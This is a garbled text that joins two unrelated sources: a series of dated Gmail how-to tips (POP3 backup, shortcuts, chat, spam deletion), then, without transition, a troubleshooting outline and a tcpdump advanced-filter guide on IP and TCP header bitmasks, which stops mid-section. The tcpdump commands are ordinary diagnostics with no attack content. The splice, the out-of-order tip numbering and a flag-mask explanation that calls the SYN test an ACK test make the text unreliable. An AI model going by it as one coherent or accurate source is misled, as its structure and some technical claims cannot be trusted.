So not only do we get a very nice, fast, WYSIWYG editor, with the addition of this feature, Gmail, in my opinion, raises the bar significantly. Before, I simply could not recommend Gmail to anyone other than tech-savvy people, because forwarding some messages was simply too diffucult. People like my parents simply would have been confused and intimidated by the original design because handling such messages took significant effort. But that has all changed. It looks like this may be the answer to open the door to the masses!

With features like Labels, comprehensive Search, Rich formatting, unobtrusive, yet targeted ads, and a gig of storage, I now feel that Gmail could be used by basically anyone, and now stands far above the competition.


[top]	[return to GmailTips.com]

Gmail Tip #41: How Much Space Do I Have?
Notorious for its April Fools jokes, Google announced on 01-Apr-2005 that it had upped its disk space quota to 2 gigabytes per user, surpassing Yahoo's recent increase to 1 gigabyte. While that's good news for Gmail users, the great news is that it's not an April Fools joke.

Having the extra space is great, but how can you tell how much storage space you have used and how much is remaining? Read on for a very simple tip to keep track of your Gmail account storage space...

OK, this one is very easy. Just scroll down to the bottom of any Gmail screen, and you will see some statistics centered near the bottom of the page. For example, it might display something like:

"You are currently using 100 MB (10%) of your 1000 MB."

No, it's certainly not rocket science, and it's quite useful.

Now, if Gmail would only show the sizes on each message...


[top]	[return to GmailTips.com]

Gmail Tip #42: A More Worldly View
Parlez-vous français? Sprechen Sie Deutsches? Or if you read any of 11 newly supported languages, you will feel right at home with Gmail. In addition to English, Gmail now supports Dutch, French, German, Italian, Japanese, Korean, Portuguese, Russian, Spanish, Simplified Chinese, Traditional Chinese, and UK English. (Sorry, no Klingon.) If you want to experience Gmail in one of these languages, read on for simple instructions to make the change...

Simply click on the "Settings" link at the upper right of any Gmail page. Look toward the middle of the page, and you will find a dropdown selector labeled "Gmail display language". Pick your desired language, and click on the "Save Changes" button at the bottom. When the screen refreshes, you will be presented with the familiar Gmail screen, just with the new language integrated throughout the interface.

While many understand multiple languages, I am sorry to say that I am only fluent in one...


[top]	[return to GmailTips.com]

Gmail Tip #43: Notes in Just Two Clicks!
"Tjeerd" from the Netherlands submitted a neat Gmail Tip that takes a different yet very simple approach to creating and managing "Notes" in your Gmail account. Notes are simply messages typically sent to yourself to store useful information. Read on for a simple method of creating Notes with just two button clicks....

In my Gmail Tip #3: How to Maintain "Notes", I described a rather elaborate, yet effective way to manage Notes in your Gmail account. It's elegant, but it requires some setup and prior knowledge of Labels and Filters.
Tjeerd suggests an alternative method that leverages the "Draft Message" function:

Just click "Compose Mail" and create a message with no recipient.

If you want, you can include "Note" in the Subject. Use whatever organizational description you want.

Then, write your note, click the "Save Draft" button, and you now have a saved Note...in just two clicks!

Basically, you are just creating Draft messages, but the Draft feature is typically very underutilized, so why not make it more useful?

Gmail already assigns a specific "View" to Drafts so they are easily accessible. Draft messages are treated like any other message, so they are completely searchable letting you can take full advantage of all of Gmail's great searching capabilities. Additioanlly, you can even apply Labels to make managing even these Notes suitable to your needs!


[top]	[return to GmailTips.com]

Gmail Tip #44: Using An Email Client
Gmail's POP3 access lets you leverage third-party Email Clients like Outlook or Thunderbird, giving you the flexibility you want. Read on to see some quick tips inspired by "Edwin" and "Zavie" on configuring and accessing Gmail's POP3 access...

POP3 email clients are common, handy tools to enable you to manage your email online or offline. Here are several examples:

|1. Outlook Express
Outlook Express is included with just about every Windows installation. Setup is simple, and though its interface is basic, it works well with Gmail.

|2. Outlook (various versions)
I used Outlook 2003, and it worked like a charm with Gmail. It's robust, a business standard, and you have all of Outlooks advanced features available to you. The only down side is that for the personal user, it can be expensive, either standalone or as part of Microsoft Office.

|3. Thunderbird
Thunderbird is an excellent solution. It's Open Source, free, cross-platform compatible, very stable, and feature-rich. I used the "Portable Thunderbird" version because of its portability, and it worked very well. For personal users, Thunderbird has probably more features than you will ever need.

|4. Other Email Clients
Just about any modern POP mail client whould work, provided ot allows SSL connections. There are numerous examples that can be found with a Google search.

In all cases, the key to setting up your email client to work with Gmail is to ensure that you can connect using a Secure SSL Connection. These settings are typically found in the client's Accounts settings screens where you must define specific ports to access Gmail's POP3 server. Gmail has an excellent Help section that details the setup for most popular POP3 email clients. This is found by clicking the "Configuration instructions" link found in the "Forward and POP" screen of Gmail's settings.

OK. To setup Gmail to allow POP3 access, click on the "Settings" link in the upper right of any Gmail page. Next, click on the "Forwarding and POP" tab. Depending on how much email you want to manage via POP, choose the appropriate selection:

|1. "Enable POP for all mail"
This will let you download all messages you have in your email account as well as any new email that arrives.

|2. "Enable POP only for mail that arrives from now on"
This option lets you download only new email that arrives since the time you activate the POP setting.

The second setting, "When messages are accessed with POP" lets you determine how Gmail will handle the messages you download. How you use your email client and Gmail wuill determine the setting you want:

|1. "keep Gmail's copy in the Inbox"
This option will leave all new email in Gmail's Inbox with "read settings" intact. This means that regardless of when you use your email client to receive messages, Gmail's Web client settings will always remain independent. Email messages are retained in your Gmail account. If you rely mostly on the Web client and use a POP3 clinet only occasionally, then this is the setting of choice. Think of this as a "parallel" setup with messages managed on both sides.

|2. "archive Gmail's copy"
This option will automatically "Archive" the message (remove it from the Inbox and retain it in Gmail's All Mail view) when you download it using your email client. This is useful when you use your email client more then Gmail's Web client. The advantage of this setting is that it leaves the message on Gmail's server as a backup. You still have full Web access should you ever want to use Gmail's Web client.

|3. "trash Gmail's copy"
This option deletes the email from Gmail's server once the message is successfully downloaded to your email client. This is useful if you use an email client exclusively, and don't want any email retained on Gmail's server.

Once you have selected your appropriate settings, click the "Save Changes" button. When you fire up your configured email client and receive messages, they will be downloaded seamlessly!

One point of note: When I initiated a Send/Receive session in both Outlook 2003 and Thunderbird (I didn't try Outlook Express) it only downloaded about 300-400 messages. Initiating another Send/Receive session downloaded another block of 300-400 messages. With over 3500 messages, I had to initiate about a dozen or so Send/Receive sessions, but when they all completed, everything downloaded. Over a broadband connection, it was quite fast.


[top]	[return to GmailTips.com]

Gmail Tip #45: Backing Up Your Gmail Account
Gmail is an excellent service, but I sometimes get concerned about the security of keeping all my messages in one place. It's not a "privacy" concern, but a "data integrity" concern: If my Gmail account somehow gets corrupted or blown away, I don't have anything to fall back on...until now. By simply using Gmail's POP3 access, you can download your entire account for offline storage! Read on for some instructions and Tips inspired by "Edwin" and "Zavie" on backing up your entire Gmail account...

The thought of the possibility of losing over 3500 messages certinaly doesn't sit well with me, so I decided to investigate Gmail's POP Mail account options. By better understanding just how it works, you can leverage it to backup your entire Gmail account, and maintain that backup on an ongoing basis. I use the Gmail's Web interface exclusively because I like the flexibility of being able to access Gmail from wherever I am. But setting up an email client to automatically download any new email permits me to retain the Web access I love while maintaining a backup repository locally.

The first things to do are to activate Gmail's POP Download feature, and configure your POP3 email client to work with Gmail. See Gmail Tip #44: Using An Email Client for details.

This Tip has some repeated elements of that Tip, but it looks at using POP access from a different angle: Backups.

Here's the key to this Tip: In order to download ALL email from your account when you initiate a Send/Receive on your email client, you need to reset Gmail's POP settings. In Gmail's "Forwarding and POP" settings page, select the "Enable POP for all mail (even mail that's already been downloaded)" option and click the Save Changes button. This ensures that when you do your first download, ALL email will be sent.

If you have previoualy enabled POP Email, select the "Disable POP" and click the Save Changes button, and then re-select the "Enable POP for all mail (even mail that's already been downloaded)" option, and click the Save Changes button. This will reset Gmail's POP settings so that ALL email gets delivered via POP.

Please be aware of a few potential issues:

|1. If you already have POP access enabled, resetting the account will re-download EVERYTHING, so you may end up with duplicates. Move any existing messages in your email client to a backup folder prior to resetting Gmail and downloading everyting.

|2. If you are setting up yout email client for the first time and want to retain the email on Gmail's server, be sure that the setting "Delete email from server" in the Account setting is UNCHECKED, otherwise the email will be deleted from Gmail after it is downloaded.

|3. When I initiated a Send/Receive session in both Outlook 2003 and Thunderbird (I didn't try Outlook Express) it only downloaded about 300-400 messages. Initiating another Send/Receive session downloaded another block of 300-400 messages. With over 3500 messages, I had to initiate about a dozen Send/Receive sessions, but when they all completed, everything downloaded. Over a broadband connection, it was quite fast.

|4. When downloading with Outlook 2003, a number of the emails that were received had Today's date instead of the date the email was sent. It looks like this only applied to email that I sent, but I'll have to verify that--it was quite a few. The majority of messages, however, appear to have the proper dates. Thunderbird retained all dates properly.

Once all your Gmail messages are downloaded, your email client will be "synced" such that when you initiate additional send/receive sessions, only new email will download. To maintain the backup on an ongoing basis, just periodically initiate a send/receive session to bring in any new email. If you have a PC that is always connected to the Internet, leaving your email client running and setting your email client to auto-download any new messages will keep things always backed up locally nicely. If you use the email client as your primary method of Gmail access, then set the auto-download to something frequent like every 10 minutes. However, if you are using the email client like I do (as a backup tool) set the auto-download to initiate every few hours or just once or twice per day. In that case, you don't need to have it download frequently, just regularly.

Again, Gmail is an excellent service, but it's nice having the peace of mind that you can always have a backup.

Thanks to "Edwin" and "Zavie" for prompting me to look into this!


[top]	[return to GmailTips.com]

Gmail Tip #46: Creating a Map Repository
Do you find yourself repeatedly looking up the same map info at any of the various online map services like Google Maps, MapQuest, or Yahoo! Maps? Here's a Tip submitted by "Andreas" that lets you maintain a simple Map Repository within Gmail. It's builds on the concept introduced in the Gmail Tip #3: How to maintain "Notes", but it's application is different. Read on for details...

Create a Contact with a Name of "Map" and an Email Address of username+ map@gmail.comThis email address is being protected from spam bots, you need Javascript enabled to view it (replacing username with your Gmail username.)

Then, create a new Label called "Map".

Finally, create a Filter to add the "Map" Label to any email addressed to username+ map@gmail.comThis email address is being protected from spam bots, you need Javascript enabled to view it . Check the "Skip the Inbox (Archive it)" checkbox to bypass the Inbox.

Whenever you look after a online city map of a friend or location you visit repeatedly. Save the map as gif-Image and send it to username+ map@gmail.comThis email address is being protected from spam bots, you need Javascript enabled to view it . Include the Name and address of the person or location in the subject line.

Using Gmail's Search, you can later find the map much faster then by using an online map-service.

Like Gmail Tip #3: How to maintain "Notes", this can be adapted for many other applications by simply changing the word "Map" in the Address, Label, and Filter to something more specific to your need.

[top]	[return to GmailTips.com]

Gmail Tip #47: Gmail Adds Chat!
Google has just announced that they are adding Chat capability within Gmail! Go to http://mail.google.com/mail/help/chat.html to learn more about the specifics. Over the next few weeks, it will be deployed to all Gmail accounts.

Adding chat to Gmail should be a huge boost for Gmail for several reasons. First, it will be integrated right into Gmail's Web-based application, so there will be no need to launch a separate application like Google Talk. This is important because it will simplify its use, and nicely integrate Gmail with chat. Second, you will not need to rely on cryptic screen names as is typical with most chat applications. You will be able to use the verbose naming that Gmail's Contacts uses.

Additionally, you will be able to set your availability status, and see when your friends are online allowing you to decide how you will contact them: by Gmail or via IM through chat. You will also be able to optionally maintain a history or log of your chat sessions.

I'll post additional information as it comes out!
Gmail Tip #49: Moving the Chat Quick Contacts Box
Here's another simple tip. By default, the integrated Chat "Quick Contacts" block displays above the "Labels" block on the left of the Gmail screen. If you seldome use Chat, you may want the location of the two blocks reversed. You can position the "Quick Contacts" block to display either above or below the "Labels" block by clicking on the "Settings" link at the top right of the Gmail screen and clicking the > "Chat" tab. Look for the "Quick Contacts location" setting and select the position from the dropdown menu. Be sure to click the "Save Changes" button!

[top]	[return to GmailTips.com]

Gmail Tip #48: Reply Without Scrolling
Here's a simple one. Do you ever find it annoying that in order to Reply to a message, you have to scroll all the way to the bottom of a message to click the "Reply" link? While reading a message, simply press the "r" key, and the Reply editing box will open ready for you to compose your reply! Oh, and pressing the "f" key will also open the "Forward" editing box!

To enable keyboard shortcuts, click on the Settings link at the top right of the screen, and click on the "General" tab. Look for the "Keyboard Shortcuts" entry and click on the "Keyboard shortcuts on" radio button.

[top]	[return to GmailTips.com]

Gmail Tip #50: Changing Subject Text When Replying or Forwarding
Sometimes, you want to reply to or forward a message, but the Subject text is either annoyingly mangled, or simply unclear. Wouldn't it be nice to be able to clean up the Subject text to make it a bit cleaner? Read on to learn how to simply edit a message's Subject text....

When composing a message, click on the "Edit Subject" link just above the editor toolbar. This opens an editable Subject text field. Make any changes you want here. When your message is sent and saved, the new Subject text will be used.

One point of note in doing this is that Gmail maintains conversations (grouped messages) by their Subject text, so altering the Subject text while composing a message will "break" that conversation, creating two conversations, one for each Subject. While this may be desirable in some cases, it may be unexpected if you don't remember how Gmail handles conversations.

Also note that you can only edit the Subject text of messages while you are composing it. You cannot edit the Subject text of an existing message.

[top]	[return to GmailTips.com]

Gmail Tip #51: Keyboard Shortcuts
Gmail's User Interface is quite usable, but sometimes a mouse just seems to get in the way of efficiency. The Gmail developers have included lots of nice keyboard shortcuts that can really make using Gmail quicker and easier. Read on for a detailed list of Gmail's keyboard shortcuts....

Gmail offers many keyboard shortcuts. To enable keyboard shortcuts, click on the Settings link at the top right of the screen, and click on the "General" tab. Look for the "Keyboard Shortcuts" entry and click on the "Keyboard shortcuts on" radio button.

Below is a table showing the current list as of 25-Jan-2006. Try 'em out!

(For the most recent version, click here.)

Shortcut Key 	Definition 	Action
c 	Compose 	Allows you to compose a new message. <Shift> + c allows you to compose a message in a new window.
/ 	Search 	Puts your cursor in the search box.
k 	Move to newer conversation 	Opens or moves your cursor to a more recent conversation. You can hit <Enter> to expand a conversation.
j 	Move to older conversation 	Opens or moves your cursor to the next oldest conversation. You can hit <Enter> to expand a conversation.
n 	Next message 	Moves your cursor to the next message. You can hit <Enter> to expand or collapse a message. (Only applicable in 'Conversation View.')
p 	Previous message 	Moves your cursor to the previous message. You can hit <Enter> to expand or collapse a message. (Only applicable in 'Conversation View.')
o or <Enter> 	Open 	Opens your conversation. Also expands or collapses a message if you are in 'Conversation View.'
u 	Return to conversation list 	Refreshes your page and returns you to the inbox, or list of conversations.
y 	Archive*
Remove from current view 	Automatically removes the message or conversation from your current view.

    * From 'Inbox,' 'y' means Archive
    * From 'Starred,' 'y' means Unstar
    * From any label, 'y' means Remove the label

* 'y' has no effect if you're in 'Spam,' 'Sent,' or 'All Mail.'
x 	Select conversation 	Automatically checks and selects a conversation so that you can archive, apply a label, or choose an action from the drop-down menu to apply to that conversation.
s 	Star a message or conversation 	Adds or removes a star to a message or conversation. Stars allow you to give a message or conversation a special status.
! 	Report spam 	Marks a message as spam and removes it from your conversation list.
r 	Reply 	Reply to the message sender. <Shift> + r allows you to reply to a message in a new window. (Only applicable in 'Conversation View.')
a 	Reply all 	Reply to all message recipients. <Shift> +a allows you to reply to all message recipients in a new window. (Only applicable in 'Conversation View.')
f 	Forward 	Forward a message. <Shift> + f allows you to forward a message in a new window. (Only applicable in 'Conversation View.')
<Esc> 	Escape from input field 	Removes the cursor from your current input field.

Combo-keys - Use the following combinations of keys to navigate through Gmail.
Shortcut Key 	Definition 	Action
<tab> then <Enter> 	Send message 	After composing your message, use this combination to send it automatically. (Supported in Internet Explorer and Firefox, on Windows.)
y then o 	Archive and next 	Archive your conversation and move to the next one.
g then a 	Go to 'All Mail' 	Takes you to 'All Mail,' the storage site for all mail you've ever sent or received (and have not deleted).
g then s 	Go to 'Starred' 	Takes you to all conversations you have starred.
g then c 	Go to 'Contacts' 	Takes you to your Contacts list.
g then d 	Go to 'Drafts' 	Takes you to all drafts you have saved.
g then i 	Go to 'Inbox' 	Returns you to the inbox.
updated 1/25/2006

[top]
Gmail Tip #52: Can I "Delete all" Spam?
Do you have a lot of Spam messages in your Spam view? I seem to get between 10 and 15 Spam messages per day. Some people like to keep their Spam view empty, so they constantly delete whatever is in there. But is there an easy way to "Delete All" Spam? Read on for the answer.... Simply put, there is currently no way to simply "Delete all Spam" if the number of Spam messages exceeds one screenful of messages. You can, however, delete them one screen at a time. You first need to click on the "All" link under the "Delete Forever" button while in the Spam view. Next, click the "Delete Forever" button. This deletes that screenful of Spam. If you have more thatn one screenful of Spam messages, repeat this for all screens of Spam. Note that if you have hundereds of Spam messages (which is not unusual) this could take a short while to delete them all.

But here's a tip: Just don't forget that Gmail automatically manages Spam for you by deleting any Spam that is over about 30 or so days old. Even though you may accumulate lots of Spam, letting Gmail auto-manage it for you can have its benefit. For example, if you inadvertently mark a message as Spam, you can always go into the Spam view and move it back to the Inbox--this which "unmarks" the message as Spam.

Though you may have the urge to just delete all Spam as you get it, why not let Gmail manage it?

[top]	[return to GmailTips.com]

Gmail Tip #53: How Can I View Outlook Stationery In Gmail?
The short answer is: "You can't." Outlook (and several other email clients) enable you to include "stationery" or background images in your email message to "dress up" the look of your email messages. Currently, Gmail does not render these images as expected. Read on for some of my thoughts about stationery....

First off, I need to step up on my soapbox for a moment....

I really never understood the draw of background images or stationery in email messages. Other than allowing you to inject a bit of individuality into a message, what purpose does it really server? I personally find them typically distracting, not so much the images themselves, but the content chosen. Some are elegant and pleasing to look at, but some are just plain distracting.

I would suggest you take a step back and really think about what you are trying to do with email. Many people get so hung up with the style or look of a message that they often overlook the actual content. While it's true that a picture can be worth a thousand words, well-written words should never be overlooked. And a nicely formatted and well-constructed signature can convey a lot of good information.

...OK, off of my soapbox.

Gmail does not currently handle stationery or background images, so if you really have to have it or use it, I suggest that you configure your Gmail account for POP access and then use an email client (like Outlook) that handles stationery. You lose Gmail's excellent Labeling and Search functions, but you can continue to use an email client that you are familiar with, while taking advantage of Gmail's excellent Spam filtering and storage space. You will still always have Web-based access should you need it.

If handling stationery is important to you, then I suggest you contact Google and recommend it as a suggested feature. Click on the Help link in the upper right corner of any Gmail screen, click the "Contact Us" link at the bottom, and click the "Suggest a feature" link. Google may not implement it, but if you don't tell them what you want, they'll never know!

[top]	[return to GmailTips.com]

Gmail Tip #54: New Feature! Select ALL conversations
Deleting Spam and emptying Trash in Gmail just got a whole lot easier! Instead of being limited to deleting just a page-at-a-time, Gmail now lets you select all Spam and Trash conversations for deletion in one simple step. Read on to see some screenshots of the new features...

One of the great annoyances of managing Gmail has been in dealing with Spam and Trash. When you had more than screenful of messages, clicking "select all" would only select all messages on the current screen. Deleting numerous messages could mean navigating multiple screens just to select and delete.

The Trash view now displays the message "Empty Trash now (messages that have been in Trash more than 30 days will be automatically deleted)" Here's a screenshot:



When you click on the "Empty Trash now" link, Gmail will display a confirmation prompt displaying the number of conversations it will delete. Click "OK" to delete, or "Cancel" to not delete.

For Spam, the Spam view now displays the message "Delete all spam messages now (messages that have been in Spam more than 30 days will be automatically deleted)" Here's a screenshot:



Clicking on the "Delete all spam messages now" link displays a confirmation prompt displaying the number of conversations in Spam to delete. Click "OK" to delete, or "Cancel" to not delete.

Yet another example of Google refining Gmail's capabilities.


[top]	[return to GmailTips.com]

Gmail Tip #55: Excluding Chat from Search Results
Here's a tip inspired by a question from Ethan Lipman, an active Gmail Chat user. He wants to be able to search his Gmail messages for key words, but the Search Results often return hits from his Chat session logs. Read on to find out how to simply exclude Chat session logs from your Search Results....

The solution turns out to be really simple, but not necessarily obvious. It appears that all Gmail Chat session logs are simply standard messages Labeled with a hidden Label of "Chat". So this means that many functions you use on Labels should work.

So, to exclude all Chat session logs from your Search Results, add the following text to your search string:

-label:Chat

Likewise, if you wanted to include words found ONLY in Chat session logs, just add the following to your search string:

+label:Chat

...making sure that it is the only "label:" string (unless you also want to include other Labels.)

Thanks to Ethan Lipman for the question!



	4.2

5. Troubleshooting

	5.1 tcpdump

		5.1.1 simple capture
tcpdump -s 0 -w capture.pcap

		5.1.2 Filters
		
			5.1.2.1  DNS


tcpdump -vvv -s 0 -l -n port 53

			5.1.2.2

		5.1.3 http://www.wains.be/pub/networking/tcpdump_advanced_filters.txt

tcpdump advanced filters
========================

Sebastien Wains <sebastien -the at sign- wains -dot- be>
http://www.wains.be

$Id: tcpdump_advanced_filters.txt 36 2013-06-16 13:05:04Z sw $


Notes :

I usually always specify the interface from which to listen.. that's the -i option you will always see in the examples.
Indeed, I have tested each rule on my laptop over the wireless adapter which is eth1.

Feel free to contact me for comments, suggestions or for reporting mistakes.
I know I'm usually terrible at explaining stuff, so let me know if something is not clear.

I'll try to keep this document updated with new useful rules.


Before I begin with advanced filters, let's review the basic syntax of tcpdump

Basic syntax :
==============

Filtering hosts :
-----------------

- Match any traffic involving 192.168.1.1 as destination or source
# tcpdump -i eth1 host 192.168.1.1

- As soure only
# tcpdump -i eth1 src host 192.168.1.1

- As destination only
# tcpdump -i eth1 dst host 192.168.1.1


Filtering ports :
-----------------

- Match any traffic involving port 25 as source or destination
# tcpdump -i eth1 port 25

- Source
# tcpdump -i eth1 src port 25

- Destination
# tcpdump -i eth1 dst port 25


Network filtering :
-------------------

# tcpdump -i eth1 net 192.168
# tcpdump -i eth1 src net 192.168
# tcpdump -i eth1 dst net 192.168


Protocol filtering :
--------------------

# tcpdump -i eth1 arp
# tcpdump -i eth1 ip

# tcpdump -i eth1 tcp
# tcpdump -i eth1 udp
# tcpdump -i eth1 icmp


Let's combine expressions :
---------------------------

Negation    : ! or "not" (without the quotes)
Concatanate : && or "and"
Alternate   : || or "or" 

- This rule will match any TCP traffic on port 80 (web) with 192.168.1.254 or 192.168.1.200 as destination host
# tcpdump -i eth1 '((tcp) and (port 80) and ((dst host 192.168.1.254) or (dst host 192.168.1.200)))'

- Will match any ICMP traffic involving the destination with physical/MAC address 00:01:02:03:04:05
# tcpdump -i eth1 '((icmp) and ((ether dst host 00:01:02:03:04:05)))'

- Will match any traffic for the destination network 192.168 except destination host 192.168.1.200
# tcpdump -i eth1 '((tcp) and ((dst net 192.168) and (not dst host 192.168.1.200)))'


Advanced header filtering :
===========================

Before we continue, we need to know how to filter out info from headers

proto[x:y] 		: will start filtering from byte x for y bytes. ip[2:2] would filter bytes 3 and 4 (first byte begins by 0)
proto[x:y] & z = 0 	: will match bits set to 0 when applying mask z to proto[x:y]
proto[x:y] & z !=0 	: some bits are set when applying mask z to proto[x:y]
proto[x:y] & z = z 	: every bits are set to z when applying mask z to proto[x:y]
proto[x:y] = z 		: p[x:y] has exactly the bits set to z


Operators : >, <, >=, <=, =, !=


This may not be clear in the first place but you'll find examples below involving these.


Of course, it is important to know what the protocol headers look like before diving into more advanced filters.


IP header
---------

	0                   1                   2                   3   
	0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|Version|  IHL  |Type of Service|          Total Length         |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|         Identification        |Flags|      Fragment Offset    |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|  Time to Live |    Protocol   |         Header Checksum       |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|                       Source Address                          |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|                    Destination Address                        |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|                    Options                    |    Padding    | <-- optional
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|                            DATA ...                           |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

I'll consider we are only working with the IPv4 protocol suite for these examples.

In an ideal world, every field would fit inside one byte. This is not the case, of course.

Are IP options set ?
--------------------

Let's say we want to know if the IP header has options set. We can't just try to filter out the 21st byte
because if no options are set, data start at the 21st byte. We know a "normal" header is usually 20 bytes 
(160 bits) long. With options set, the header is longer than that. The IP header has the header 
length field which we will filter here to know if the header is longer than 20 bytes.

	+-+-+-+-+-+-+-+-+
	|Version|  IHL  |
	+-+-+-+-+-+-+-+-+

Usually the first byte has a value of 01000101 in binary.

Anyhow, we need to divide the first byte in half...

0100 = 4 in decimal. This is the IP version.
0101 = 5 in decimal. This is the number of blocks of 32 bits in the headers. 5 x 32 bits = 160 bits or 20 bytes.

The second half of the first byte would be bigger than 5 if the header had IP options set.

We have two ways of dealing with that kind of filters.

| 1. Either try to match a value bigger than 01000101. This would trigger matches for IPv4 traffic with IP options set, 
   but ALSO any IPv6 traffic !

In decimal 01000101 equals 69.

Let's recap how to calculate in decimal.

0 : 0		\
1 : 2^6 = 64	 \ First field (IP version)
0 : 0		 /
0 : 0		/
-
0 : 0		\
1 : 2^2 = 4	 \ Second field (Header length)
0 : 0		 /
1 : 2^0 = 1	/

64 + 4 + 1 = 69

The first field in the IP header would usually have a decimal value of 69.
If we had IP options set, we would probably have 01000110 (IPv4 = 4 + header = 6), which in decimal equals 70.

This rule should do the job :
# tcpdump -i eth1 'ip[0] > 69'

Somehow, the proper way is to mask the first half/field of the first byte, because as mentionned earlier, 
this filter would match any IPv6 traffic.

| 2. The proper/right way : "masking" the first half of the byte

0100 0101 : 1st byte originally
0000 1111 : mask (0xf in hex or 15 in decimal). 0 will mask the values while 1 will keep the values intact.
=========
0000 0101 : final result

You should see the mask as a power switch. 1 means on/enabled, 0 means off/disabled.

The correct filter :

In binary
# tcpdump -i eth1 'ip[0] & 15 > 5'

or 

In hexadecimal
# tcpdump -i eth1 'ip[0] & 0xf > 5'

I use hex masks.

Recap.. That's rather simple, if you want to :
- keep the last 4 bits intact, use 0xf (binary 00001111)
- keep the first 4 bits intact, use 0xf0 (binary 11110000)


DF bit (don't fragment) set ?
-----------------------------

Let's now trying to know if we have fragmentation occuring, which is not desirable. Fragmentation occurs 
when a the MTU of the sender is bigger than the path MTU on the path to destination.

Fragmentation info can be found in the 7th and 8th byte of the IP header.

	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|Flags|      Fragment Offset    |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

Bit 0: 	reserved, must be zero
Bit 1: 	(DF) 0 = May Fragment, 1 = Don't Fragment.
Bit 2: 	(MF) 0 = Last Fragment, 1 = More Fragments.

The fragment offset field is only used when fragmentation occurs.

If we want to match the DF bit (don't fragment bit, to avoid IP fragmentation) :

The 7th byte would have a value of :
01000000 or 64 in decimal

# tcpdump -i eth1 'ip[6] = 64'


Matching fragmentation ?
------------------------

- Matching MF (more fragment set) ? This would match the fragmented datagrams but wouldn't match the last 
  fragment (which has the 2nd bit set to 0).
# tcpdump -i eth1 'ip[6] = 32'

The last fragment have the first 3 bits set to 0... but has data in the fragment offset field.

- Matching the fragments and the last fragments
# tcpdump -i eth1 '((ip[6:2] > 0) and (not ip[6] = 64))'

A bit of explanations :
"ip[6:2] > 0" would return anything with a value of at least 1
We don't want datagrams with the DF bit set though.. the reason of the "not ip[6] = 64"

If you want to test fragmentation use something like :
ping -M want -s 3000 192.168.1.1


Matching datagrams with low TTL
-------------------------------

The TTL field is located in the 9th byte and fits perfectly into 1 byte.
The maximum decimal value of the TTL field is thus 255 (11111111 in binary).

This can be verified :
$ ping -M want -s 3000 -t 256 192.168.1.200
ping: ttl 256 out of range

	+-+-+-+-+-+-+-+-+
	|  Time to Live |
	+-+-+-+-+-+-+-+-+

We can try to find if someone on our network is using traceroute by using something like this on the gateway :
# tcpdump -i eth1 'ip[8] < 5'


Matching packets longer than X bytes
------------------------------------

Where X is 600 bytes

# tcpdump -i eth1 'ip[2:2] > 600'


More IP filtering
-----------------

We could imagine filtering source and destination addresses directly in decimal addressing.
We could also match the protocol by filtering the 10th byte.

It would be pointless anyhow, because tcpdump makes it already easy to filter out that kind of info.


TCP header
----------

	0                   1                   2                   3   
	0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|          Source Port          |       Destination Port        |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|                        Sequence Number                        |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|                    Acknowledgment Number                      |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|  Data |       |C|E|U|A|P|R|S|F|                               |
	| Offset|  Res. |W|C|R|C|S|S|Y|I|            Window             | 
	|       |       |R|E|G|K|H|T|N|N|                               |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|           Checksum            |         Urgent Pointer        |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|                    Options                    |    Padding    |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
	|                             data                              |
	+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+

- Matching any TCP traffic with a source port > 1024
# tcpdump -i eth1 'tcp[0:2] > 1024'

- Matching TCP traffic with particular flag combinations

The flags are defined in the 14th byte of the TCP header.

	+-+-+-+-+-+-+-+-+
	|C|E|U|A|P|R|S|F|
	|W|C|R|C|S|S|Y|I|
	|R|E|G|K|H|T|N|N|
	+-+-+-+-+-+-+-+-+

In the TCP 3-way handshakes, the exchange between hosts goes like this :

| 1. Source sends SYN 
| 2. Destination answers with SYN, ACK 
| 3. Source sends ACK

- If we want to match packets with only the SYN flag set, the 14th byte would have a binary 
  value of 00000010 which equals 2 in decimal.
# tcpdump -i eth1 'tcp[13] = 2'

- Matching SYN, ACK (00010010 or 18 in decimal)
# tcpdump -i eth1 'tcp[13] = 18'

- Matching either SYN only or SYN-ACK datagrams
# tcpdump -i eth1 'tcp[13] & 2 = 2'

We used a mask here. It will returns anything with the ACK bit set (thus the SYN-ACK combination as well)

Let's assume the following examples (SYN-ACK)

